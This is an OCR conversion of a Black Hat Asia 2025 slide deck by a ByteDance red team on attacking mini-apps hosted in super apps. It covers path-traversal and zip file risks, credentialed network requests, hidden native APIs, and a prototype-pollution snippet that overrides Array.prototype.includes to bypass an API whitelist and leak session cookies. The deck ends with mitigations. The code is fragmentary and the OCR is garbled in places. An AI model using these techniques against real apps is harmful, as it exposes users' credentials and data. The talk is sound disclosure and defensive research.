---
title: "Mini-App But Great Impact New Ways to Compromise Mobile Apps"
speakers: ["Wei Wen", "Xiangyu Cao", "Jiangchunxi Hou", "Zixi Liao", "Yingyan Song", "Zhongcheng Li", "Yijie Zhao", "Bin Ma"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf"
pages: 26
sha256: "c08d7229adc1dab3895c58b2ff02f71e58b7f18617fcd45c92a47f3580545637"
text_chars: 8269
ocr_pages: 9
has_ocr: true
redacted_secrets: 0
ocr_confidence: 85.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:58:34Z"
---
# Mini-App But Great Impact New Ways to Compromise Mobile Apps

**Speakers:** Wei Wen, Xiangyu Cao, Jiangchunxi Hou, Zixi Liao, Yingyan Song, Zhongcheng Li, Yijie Zhao, Bin Ma  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Wei Wen & Xiangyu Cao & Jiangchunxi Hou & Zixi Liao & Yingyan Song & Zhongcheng Li & Yijie Zhao & Bin Ma_Mini-App But Great Impact New Ways to Compromise Mobile Apps.pdf` (26 pages)


## Slide 1

Mini-App But Great Impact: New Ways to Compromise Mobile Apps

IES Red Team of ByteDance

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
APRIL 3-4, 2025
BRIEFINGS
Mini-App But Great Impact:
New Ways to Compromise Mobile Apps
IES Red Team of ByteDance
```

## Slide 2

- Security researchers and developers at IES Red Team of ByteDance

## About us

- Privacy and data protection researches involving Apps and Systems

- Security bug hunters including Mobile, Web and Cloud

- • Speakers at Black Hat USA/Europe/Aisa, Black Hat USA Arsenal

#BHAS   @BlackHatEvents

## Slide 3

1. Introduction of Mini-Apps

2. Risk Assessment

Outline

3. Further Exploit

4. Security Recommendations

5. Concolusion

#BHAS   @BlackHatEvents

## Slide 4

# 1. Introduction of Mini-Apps

#BHAS   @BlackHatEvents

## Slide 5

### Mini-Apps and Super Apps

##### **Mini-app**

- hybrid solution

- Web technologies

- Integrates with the capabilities of native apps.

##### **Super app**

- Native app

- Host and Support for Mini-apps

- Provide resources

#BHAS   @BlackHatEvents

## Slide 6

### Comparison Study

|**Feature**|**Mini-app**|**Web App (Chrome)**|**Native App (Android)**|
|---|---|---|---|
|Deployed|pacgake|Web resources|apk|
|Engine|WebView/Native
V8/JavaScriptCore|Blink/Gecko/WebKit
V8/JavaScriptCore|ART/Dalvik|
|Dependencies|Super app|Browser|Android OS|

#BHAS   @BlackHatEvents

## Slide 7

#### <u>File API:</u>

- x.saveFIle - x.openFIle

- x.downloadFile

- x...

#### <u>Network API:</u>

- x.request

- x.fetch

- x.upload

- x...

#### <u>Location API:</u>

- x.getLocation

- x.queryGPS

- x.updateLocation

- ...

#### <u>Media API:</u>

- x.openCamera

- x.openMicrophone

- x.accessAlbum

- x..

### API & Security Mechanism

Security

Permission Check

- Vertical

- Horizontal

### Sandbox

- Data Storage

- Code Execution

- Runtime Environment

#BHAS   @BlackHatEvents

## Slide 8

# 2. Risk Assessment

#BHAS   @BlackHatEvents

## Slide 9

### Comparsion and Risk Assessment

||**Web App**|**Native  App**|**Mini-App**|
|---|---|---|---|
|Access Control|✓|✓|✓|
|Sandbox Storage|-|✓|**?**|
|Same-origin policy|✓|-|**?**|
|Process isolation|✓|✓|**?**|

#BHAS   @BlackHatEvents

## Slide 10

Risk Assessment

FileManager API Operation
readFileSync read
API for File Access
writeFileSync write
unzip write
Risk Vunl Super-Apps
Relative path in parameter 2/9
Risk for File Access 3/9
Symbolic link in parameter
Filename with relative path in zip  5/9
file

#BHAS   @BlackHatEvents

## Slide 11

File Manager Risk Detail

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pifcuchat File Manager Risk Detail
OQ Mini-App Runtime
: Malicious :
quick open
Credential Leak
Remote Code
Execuation
```

## Slide 12

Risk Assessment

Network API Operation
request Http Request
API for
upload Http Request
Network
connectSocket WebSocket connect
sendSocketMessage WebSocket send
onSocketMessage WebSocket response
Risk Vuln Super-Apps
Risk for
request with credentials to 1st-party 1/9
Network
request with credentials to 3rd-party 8/9
full access to response data 9/9

~~#BHAS   @BlackHa~~ tEvents

## Slide 13

### Network Risk Detail

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bene Network Risk Detail
© Mini-App Runtime
Super-App
quick open
```

## Slide 14

# 3. Further Exploit

#BHAS   @BlackHatEvents

## Slide 15

1.JSCore analysis: static analysis and dynamic debugging of JSCore code can find hidden APIs at key nodes of public API processing.

2.Super-App analysis: reverse analysis of the host application's processing code for the mini program API can also find hidden APIs.

### Hidden API

#BHAS   @BlackHatEvents

## Slide 16

###### Mini-App API

### Invoke Sample

###### Malicious Mini-App

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisakhat Invoke Sample
ASIA 2025 r
Mini-App API Malicious Mini-App
// invoke Hiden API
i : // undocumented, used by 1st-party Mini-App
data:{ getUserDatal: function(){
weather: null, x.HidenRequest (4
isRequesting: false url: "uri_for_user_data",
_ method: "GET",
: i success: (res)=>{
Page
onLoad: function(){
this.getWeatherData();
// invoke documented API
getWeatherData: function(){ getUserData2: function() {
: i // invoke hiden API from global privileged variables
x. request ({ // (undocumented, interact with native)
url: “uri_for_weather_data", globalThis. testval. cal Native ({
method: "GET", method: "nativeRequest",
success: (res)=>{ parms: {
// : H url: "xxx",
— withCredentials: true
```

## Slide 17

### Hidden API Exploit

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Mini-App
arty
getWeatherData: function(){
[x. request ({
method: "GET",
success: (res)=>{},
1-st Party
url: "uri_for_user_data",
method: "GET",
success: (res)=>{},
Malicious
Method: “nativeRequest",
parms: {
method: "GET",
withCredentials: true
})
function request(args){
invokeMethod("request", args, False);
invokeMethod("'NativeRequest", args, True);
callNative
method: "nativeRequest", <
parms: {
method: "GET",
withCredentials: isInnerApp
public void sendRequest(String a, String b){
if (withCredentials) <4
Hidden API Exploit
Framework
Super App
String response = readResponse(connection) ;
if (response != null)
String data = response.content;
sendResponseToJs(callid, data);
```

## Slide 18

### Prototype Pollution

#### 1.Whitelist bypass 2.Private API parameter hijacking 3.User credentials leakage

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bifakhat Prototype Pollution
1.Whitelist bypass
2.Private API parameter hijacking
3.User credentials leakage
```

## Slide 19

### Prototype Pollution Demo

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
piseichat Prototype Pollution Demo
ASIA 2025 e@
> Array.prototype.src_includes = Array.prototype. includes;
Array.prototype.includes = function(search, Index) {
(if(search=== "“aaa"){ |
return false; »
} \
return Array.prototype.src_includes.call(this, search, Index);
Ki \
« f (search, Index) { \
if(search=== "aaa"){
return false;
) |
> let whiteList = ({"aaa",) "bbb",
return in an search, Index);
> whiteList. includes ("bbb")
< true
[> whiteList.includes("aaa") | /
« false ~
```

## Slide 20

Prototype Pollution in Mobile Security

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Page({
data:{
userName: null,
isRequesting: false
onLoad: function(){
getUserData: function(){
Prototype Pollution in Mobile Security
Mini-App Framework
globalThis. testval={
callNative: function(method, parms) {
// wos
throw “API deny"; 7
var r=
d(method, parms); 3
return ol(r) ? r.then(function(t) {
Array.prototype.src_includes = Array.prototype. includes;
Array.prototype.includes = function(search, Index) {
if(search=== "nativeRequest") {
return false;
return open(e,t); —__...-""
var r = Number(e);
};
(globalThis.testval.callNative({ |
method: "nativeRequest",
parms: {
urls "Xxx",
withCredentials:
success: (res)=>{
const userName = res.data.userName;
this.setData({
userName:
true
userName,
fail: (err)=>{
console. log("get fail", err);
this.setData({isRequesting: false});
“return Array.prototype.src_includes.call(this, search,
e(r,t); \
yo : n(uc(t));
call success }
@JavascriptInterface Super App
public void sendRequest(String a,\ String b){
{if (withCredentials) {
connection.setRequestProperty("Cookie", getSessionCookies());
{String response = readResponse(connection) ;
if (response != null) {
String data = response.content;
sendResponseToJs(callId, data);
```

## Slide 21

# 4. Security Recommendations

#BHAS   @BlackHatEvents

## Slide 22

Security Suggestion
Vulnerability Mitigation
FileManager API Sandbox for file accessing
NetWork API Strict restrictions for domain
Hidden API Permission control for Privileged API
Prototype Pollution Runtime Protection such as object freeze
Others ？

#BHAS   @BlackHatEvents

## Slide 23

### Security Suggestion

• Sandbox Isolation

Create an independent operating environment for each Mini-Apps to ensure that they do not interfere with each other

• Permission Control

Strictly control the access authorization for Mini-Apps, including access rights to the file system, network, storage, and devices

• Runtime Security Control the OS runtime environment of Mini-Apps, including system resources such as memory, CPU, and GPU, to prevent malicious code from causing excessive consumption or damage of system resources

#BHAS   @BlackHatEvents

## Slide 24

# 5. Conclusion

#BHAS   @BlackHatEvents

## Slide 25

### Conclusion

1. Comparison between Mini-Apps, Web Apps, and Native Apps

2. Risk Assessment: Vulnerabilities in File System and Network Management 3. In-Depth Analysis: Hidden APIs and Exposed Global Variables

4. Prototype Pollution: Transitioning from Web Security to Mobile Security

5. Security suggestions for Mini-Apps and Super-Apps

#BHAS   @BlackHatEvents

## Slide 26

# Thanks for Listening

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
APRIL 3-4, 2025
BRIEFINGS
Thanks for Listening
```
